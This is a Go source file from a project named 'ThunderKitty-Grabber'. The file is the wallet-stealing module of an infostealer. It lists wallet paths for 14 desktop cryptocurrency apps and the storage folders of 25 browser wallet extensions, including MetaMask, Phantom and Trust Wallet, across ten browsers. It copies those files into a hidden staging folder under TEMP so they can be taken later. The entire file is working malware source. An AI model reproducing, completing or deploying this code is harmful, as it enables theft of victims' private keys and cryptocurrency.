package CryptoWallets

import (
	Common "ThunderKitty-Grabber/utils/common"
	"fmt"
	"os"
	"path/filepath"
)

var folderCrypto = os.Getenv("TEMP") + "\\ThunderKitty\\ThunderKittyWallets"

func Run() {
	LocalCryptoWallets()
	BrowserWallets()
}

func LocalCryptoWallets() {
	walletPaths := map[string]map[string]string{
		"Local Wallets": {
			"Armory":           filepath.Join(os.Getenv("APPDATA"), "Armory", "*.wallet"),
			"Atomic":           filepath.Join(os.Getenv("APPDATA"), "Atomic", "Local Storage", "leveldb"),
			"Bitcoin":          filepath.Join(os.Getenv("APPDATA"), "Bitcoin", "wallets"),
			"Bytecoin":         filepath.Join(os.Getenv("APPDATA"), "bytecoin", "*.wallet"),
			"Coinomi":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Coinomi", "Coinomi", "wallets"),
			"Dash":             filepath.Join(os.Getenv("APPDATA"), "DashCore", "wallets"),
			"Electrum":         filepath.Join(os.Getenv("APPDATA"), "Electrum", "wallets"),
			"Ethereum":         filepath.Join(os.Getenv("APPDATA"), "Ethereum", "keystore"),
			"Exodus":           filepath.Join(os.Getenv("APPDATA"), "Exodus", "exodus.wallet"),
			"Guarda":           filepath.Join(os.Getenv("APPDATA"), "Guarda", "Local Storage", "leveldb"),
			"com.liberty.jaxx": filepath.Join(os.Getenv("APPDATA"), "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
			"Litecoin":         filepath.Join(os.Getenv("APPDATA"), "Litecoin", "wallets"),
			"MyMonero":         filepath.Join(os.Getenv("APPDATA"), "MyMonero", "*.mmdbdoc_v1"),
			"Monero GUI":       filepath.Join(os.Getenv("APPDATA"), "Documents", "Monero", "wallets"),
		},
	}

	zephyrPath := filepath.Join(os.Getenv("APPDATA"), "Zephyr", "wallets")
	err := os.MkdirAll(zephyrPath, os.ModePerm)
	if err != nil {
		fmt.Printf("Error creating Zephyr directory: %v\n", err)
		return
	}

	if _, err := os.Stat(zephyrPath); err == nil {
		err := filepath.Walk(zephyrPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() && filepath.Ext(info.Name()) == ".keys" {
				destFile := filepath.Join(folderCrypto, "Zephyr", info.Name())
				err := Common.CopyFile(path, destFile)
				if err != nil {
					fmt.Printf("Error copying file: %v\n", err)
				}
			}
			return nil
		})
		if err != nil {
			fmt.Printf("Error walking Zephyr directory: %v\n", err)
		}
	}
	for _, paths := range walletPaths {
		for pathName, sourcePath := range paths {
			if _, err := os.Stat(sourcePath); err == nil {
				destination := filepath.Join(folderCrypto, pathName)
				err := Common.CopyDir(sourcePath, destination)
				if err != nil {
					fmt.Printf("Error copying directory: %v\n", err)
				}
			}
		}
	}
}

func BrowserWallets() {
	browserPaths := map[string]string{
		"Brave":       filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
		"Chrome":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		"Chromium":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Chromium", "User Data"),
		"Edge":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		"EpicPrivacy": filepath.Join(os.Getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
		"Iridium":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data"),
		"Opera":       filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
		"OperaGX":     filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
		"Vivaldi":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
		"Yandex":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
	}

	walletDirs := map[string]string{
		"dlcobpjiigpikoobohmabehhmhfoodbb": "Argent X",
		"fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain Wallet",
		"jiidiaalihmmhddjgbnbgdfflelocpak": "BitKeep Wallet",
		"bopcbmipnjdcdfflfgjdgdjejmgpoaab": "BlockWallet",
		"odbfpeeihdkbihmopkbjmoonfanlbfcl": "Coinbase",
		"hifafgmccdpekplomjjkcfgodnhcellj": "Crypto.com",
		"kkpllkodjeloidieedojogacfhpaihoh": "Enkrypt",
		"mcbigmjiafegjnnogedioegffbooigli": "Ethos Sui",
		"aholpfdialjgjfhomihkjbmgjidlcdno": "ExodusWeb3",
		"hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
		"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
		"afbcbjpbpfadlkmhmclhkeeodmamcflc": "MathWallet",
		"nkbihfbeogaeaoehlefnkodbefgpgknn": "Metamask",
		"ejbalbakoplchlghecdalmeeeajnimhm": "Metamask2",
		"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX",
		"jnmbobjmhlngoefaiojfljckilhhlhcj": "OneKey",
		"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
		"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
		"lgmpcpglpngdoalbgeoldeajfclnhafa": "SafePal",
		"mfgccjchihfkkindfppnaooecgfneiii": "TokenPocket",
		"nphplpgoakhhjchkkhmiggakijnkhfnd": "Ton",
		"ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
		"egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
		"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
		"heamnjbnflcikcggoiplibfommfbkjpj": "Zeal",
	}

	for browser, browserPath := range browserPaths {
		if _, err := os.Stat(browserPath); err == nil {
			err := filepath.Walk(browserPath, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return err
				}
				if info.IsDir() && info.Name() == "Local Extension Settings" {
					localExtensionsSettingsDir := path
					for walletKey, walletName := range walletDirs {
						extentionPath := filepath.Join(localExtensionsSettingsDir, walletKey)
						if _, err := os.Stat(extentionPath); err == nil {
							err := filepath.Walk(extentionPath, func(path string, info os.FileInfo, err error) error {
								if err != nil {
									return err
								}
								if !info.IsDir() {
									walletBrowser := fmt.Sprintf("%s (%s)", walletName, browser)
									walletDirPath := filepath.Join(folderCrypto, walletBrowser)
									err := Common.CopyFile(path, filepath.Join(walletDirPath, info.Name()))
									if err != nil {
										fmt.Printf("Error copying file: %v\n", err)
									}
									locationFile := filepath.Join(walletDirPath, "Location.txt")
									err = Common.WriteToFile(locationFile, extentionPath)
									if err != nil {
										fmt.Printf("Error writing to file: %v\n", err)
									}
									fmt.Printf("[!] Copied %s wallet from %s to %s\n", walletName, extentionPath, walletDirPath)
								}
								return nil
							})
							if err != nil {
								fmt.Printf("Error walking directory: %v\n", err)
							}
						}
					}
				}
				return nil
			})
			if err != nil {
				fmt.Printf("Error walking directory: %v\n", err)
			}
		}
	}
}